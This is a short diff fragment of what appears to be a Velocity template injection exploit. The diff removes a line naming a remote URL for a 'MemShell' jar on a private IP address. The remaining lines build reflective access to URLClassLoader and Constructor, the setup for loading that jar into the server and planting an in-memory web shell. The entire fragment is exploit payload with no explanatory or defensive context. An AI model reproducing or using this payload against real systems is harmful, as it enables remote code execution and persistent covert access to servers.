@@ -1,5 +1,4 @@
 #set($x='')
-#set($urljar = 'http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar')
 #set($url0=$x.class.forName('java.net.URLClassLoader'))
 #set($con=$x.class.forName('java.lang.reflect.Constructor'))
 #set($url1=$x.class.forName('[Ljava.net.URL;'))
